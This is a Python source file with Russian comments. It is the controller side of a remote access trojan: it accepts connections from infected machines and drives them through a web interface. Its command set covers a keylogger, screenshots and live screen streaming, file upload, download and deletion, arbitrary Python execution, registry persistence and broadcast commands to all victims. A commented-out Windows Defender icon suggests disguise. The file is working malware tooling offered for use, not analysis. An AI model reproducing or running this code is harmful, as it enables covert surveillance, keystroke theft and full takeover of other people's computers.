import socket
import json
import os

import threading

# stream
import sys
import cv2
import pickle
import numpy as np
import struct
from PIL import Image, ImageTk

import tkinter as tk
import time

# archive
import shutil

### Визуализация

import eel

# ЭТО ДОЛЖНО БЫТЬ ВНАЧАЛЕ, ИНАЧЕ ОН НЕ ИНИЦИАЛИЗИРУЕТ ВСЕ ФУНКЦИИ
eel.init('web')

#####  GLOBAL VARIABLES
targets = []
ips = []

SERVER_IP = '192.168.1.157'#'127.0.0.1'
SERVER_PORT = 5555

STOP_FLAG = False
COUNT = 0

HELP_TEXT = '''<br>
								quit								--> Quit Session With Target<br>
								disconnect					--> Disconnect Target for 20s<br>
								clear								--> Clear The Screen<br>
								get_system_info     --> Accept indo about Target machine
								<br>
								cd *Directory Name*	--> Change Directory On Target<br>
								ls									--> View what is inside folder<br>
								rename=>*OLD_NAME* | *NEW_NAME* --> change old name to new name
								<br>
								create_file *NAME*  --> Create file on Target<br>
								delete_file *NAME*  --> Delete file on Target<br>
								create_folder *NAME*--> Create folder on Target<br>
								delete_folder *NAME*--> Delete folder on Target<br>
								upload_folder
								<br>
								upload_file *NAME*	  --> Upload File To the target Machine<br>
								upload_folder *NAME*	--> Upload Your Folder To the target Machine<br>
								download_file *NAME*  --> Download File From target Machine<br>
								download_folder *NAME*--> Download Folder From target Machine<br>
								screenshot					  --> Take a screenshot<br>
								<br>
								keylog_start				--> Start the Keylogger<br>
								keylog_dump					--> Print Keystrokes That The Target Inputted<br>
								keylog_stop					--> Stop And Self Destruct Keylogger File<br>
								<br>
								python_exec *code()* 								--> Execute python code<br>
								python_exec_file *NAME* 			--> Execute python file<br>
								<br>
								persistence *RegName* *fileName*	--> Create Persistence In The Registry (To Autoload)<br>
						'''
###

@eel.expose
def output_to_html(value):
		eel.output(value)

@eel.expose
def output_catalog_to_html(value):
		eel.output_catalog(value)

class ScreenStream(tk.Tk):
		def __init__(self):
				super().__init__()
				self.title("Stream") 
				self.geometry('1280x720')
				#self.iconbitmap('windows_defender.ico')

				self.frame=tk.Frame(self, width=1280, height=720)
				self.frame.place(x=0, y=0) #.grid(row=0,column=0)
				self.canvas=tk.Canvas(self.frame, bg='#FFFFFF', width=1280, height=720)
				self.canvas.pack(side=tk.LEFT, expand=True, fill=tk.BOTH)

		def show_stream(self, target):
				data = b''
				payload_size = struct.calcsize("L")
				try:
						while True:
								while len(data) < payload_size:
										data += target.recv(4096)
								packed_msg_size = data[:payload_size]

								data = data[payload_size:]
								msg_size = struct.unpack("L", packed_msg_size)[0]

								while len(data) < msg_size:
										data += target.recv(4096)
								frame_data = data[:msg_size]
								data = data[msg_size:]

								frame=pickle.loads(frame_data)
								#print(frame.size)

								img = Image.fromarray(frame)#.resize((1280, 720))
								imgtk = ImageTk.PhotoImage(image=img)

								self.canvas.create_image(0, 0, anchor='nw',image=imgtk)
								self.frame.update()
				except:
						return True

# Принимаем
def reliable_recv(target):
		data = ''
		while True:
				try:
						# Нужно декодировать в python3 (иначе будет ошибка)
						# rstrip() - чтобы не было переноса на новую строку
						data = data + target.recv(1024).decode().rstrip()
						return json.loads(data)
				except ValueError:
						continue

# Отправить команду
def reliable_send(target, data):
		jsondata = json.dumps(data)
		target.send(jsondata.encode()) # В python3 - нужен encode

def exists(name):
		if (os.path.exists(name) == False):
				f = open('ERROR_DOESNT_EXIST.txt', 'a+')
				f.write('ERROR FILE or FOLDER DOESNT EXIST')
				f.close()
				f = open('ERROR_DOESNT_EXIST.txt', 'rb')
				target.send(f.read())
				f.close()
				os.remove('ERROR_DOESNT_EXIST.txt')
				eel.alert_message('Такого файла/каталога не существует, был загружен шаблон Ошибки')
				return False
		return True
# Загрузить файл на комп назначения
def upload(target, name):
    # Файл бинарный, поэтому нужно исп rb
		if (exists(name)):
				if (os.path.isdir(name)):
						shutil.make_archive('archive_' + name, 'zip', name)
						f = open('archive_' + name + '.zip', 'rb')
						target.send(f.read())
						f.close()
						os.remove('archive_' + name + '.zip')
				else:
						f = open(name, 'rb')
						target.send(f.read())
						f.close()
				eel.alert_message('Файл успешно загружен')

def download(target, object_type, name):
		global COUNT
		# Файл бинарный, поэтому нужно исп wb
		if (object_type == 'file'):
				f = open('download/' + name, 'wb')
		elif (object_type == 'folder'):
				f = open('download/' + name + '.zip', 'wb')
		elif (object_type == 'screenshot'):
				f = open('download/screenshot_%d.png' % (name), 'wb')
				target.settimeout(2)
				COUNT += 1
		# Чтобы обнаржуить окончание загрузки файла
		# выставляем таймаут
		# Если файл закочится, цикл завершится
		target.settimeout(1)
		chunk = target.recv(1024)
		while chunk:
				f.write(chunk)
				try:
						chunk = target.recv(1024)
				except socket.timeout as e:
						break
		# Выставялем timeout=None, чтобы не было пролем с другими функциями
		target.settimeout(None)
		f.close()
		eel.alert_message('Файл успешно загружен c удаленного устройства, если с ним есть какие-то проблемы (нечитаемые буквы), попробуйте изменить его кодировку')

def end_session(target, num):
		global targets
		
		target.close()
		targets.remove(target)
		eel.delete_node(num)

def open_stream(target):
		try:
				screen_stream = ScreenStream()
				value = screen_stream.show_stream(target)
				return True
		except:
				output_to_html('Unexpecting stream error')
				return False

def get_name(command):
		if (command[:12] == 'upload_file '):
				return command[12:]
		elif(command[:14] == 'upload_folder '): 
				return command[14:]
		elif(command[:14] == 'download_file '):
				return command[14:]
		elif(command[:16] == 'download_folder '):
				return command[16:]
		elif(command == 'screenshot'):
				return COUNT

def get_command(command):
		if(command[:14] == 'download_file '):
				return 'file'
		elif(command[:16] == 'download_folder '):
				return 'folder'
		elif(command == 'screenshot'):
				return 'screenshot'

# Принимаем данные от клента
# Присоединиться к удаленной сессии
@eel.expose
def solo_command(session_num, command):
		global COUNT
		global targets
		try:
				num = int(session_num)
				target = targets[num]
					
				reliable_send(target, command)

				if command == 'quit':
						end_session(target, num)
				elif command == 'disconnect':
						end_session(target, num)
				elif command[:3] == 'cd ' or \
						 command[:2] == 'ls':
						result = reliable_recv(target)
						output_catalog_to_html(result)
				elif command[:12] == 'create_file ' or \
						 command[:12] == 'delete_file ' or \
						 command[:14] == 'create_folder ' or \
						 command[:14] == 'delete_folder ' or \
						 command[:8] == 'rename=>':
						result = reliable_recv(target)
						output_catalog_to_html(result)
				elif command[:14] == 'upload_folder ' or \
						 command[:12] == 'upload_file ':
						upload(target, get_name(command))
				elif command[:14] == 'download_file ' or \
						 command[:16] == 'download_folder ' or \
						 command == 'screenshot':
						download(target, get_command(command), get_name(command))
				elif command[:13] == 'screen_stream':
						open_stream(target);
						print('was Status. Target reconnecting')
						reliable_send(target, 'reconnect')
						end_session(target, num)
				elif command[:15] == 'get_system_info':
						result = reliable_recv(target).split(',')
						print_list_to_html(result)
				elif command[:12] == 'python_exec ' or \
						 command[:17] == 'python_exec_file ':
						result = reliable_recv(target)
						output_to_html(result)
				elif command == 'help':
						output_to_html(HELP_TEXT)
				else:
						result = reliable_recv(target)
						output_to_html(result)
		except:
				print('[-] No Session Under That ID Number or Bad Request')
				output_to_html('[-] No Session Under That ID Number or Bad Request')

@eel.expose
def add_tareget_to_html(num, ip):
		target = targets[num]
		reliable_send(target, 'get_system_info')
		result = reliable_recv(target).split(',')
		eel.added_new_node(num, ip, result)

def accept_conections():
		global targets
		global ips
		while True:
				if STOP_FLAG:
						break
				sock.settimeout(1)
				try:
						target, ip = sock.accept()
						targets.append(target)
						ips.append(ip)
						print(str(ip) + ' has connected')
						output_to_html(str(ip) + ' has connected')
						add_tareget_to_html(len(targets)-1, ip)
				except:
					pass

# Связываем сокет
# IPv4 - socket.AF_INET
# TCP  - socket.SOCK_STREAM
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((SERVER_IP, SERVER_PORT))
sock.listen(5) # Ограничение на 5 узлов
t1 = threading.Thread(target=accept_conections)
t1.start()
print('[+] Waiting For The Incoming Connections')
output_to_html('[+] Waiting For The Incoming Connections')

@eel.expose
def common_command(command):
		global targets
		global STOP_FLAG
		# Список удаленных компьютеров
		if command == 'targets':
				counter = 0
				for ip in ips:
						print('Session ' + str(counter) + ' --- ' + str(ip))
						output_to_html('Session ' + str(counter) + ' --- ' + str(ip))
						counter += 1
		# OSError: [WinError 10038] Сделана попытка выполнить операцию на объекте, не являющемся сокетом
		elif command == 'exit':
				for target in targets:
						reliable_send(target, 'disconnect')
						# Закривает сокет удаленного устройства
						target.close()
				# Закрывает свой сокет
				sock.close()
				# Устанавливаем флаг, что прервет accept_connections
				STOP_FLAG = True
				t1.join()
				quit()
		elif command[:8] == 'sendall ':
				x = len(targets)
				print(x)
				i = 0
				try:
						while i < x:
								tarnumber = targets[i]
								print(tarnumber)
								reliable_send(tarnumber, command[8:])
								i += 1
				except:
						print('Failed')
						output_to_html('Failed')
		else:
				print('[!!] Command Doesnt Exists')
				output_to_html('[!!] Command Doesnt Exists')


#####

# ЭТО ДОЛЖНО БЫТЬ В КОНЦЕ, ИНАЧЕ ОН НЕ ИНИЦИАЛИЗИРУЕТ ВСЕ ФУНКЦИИ
eel.start('main.html')

####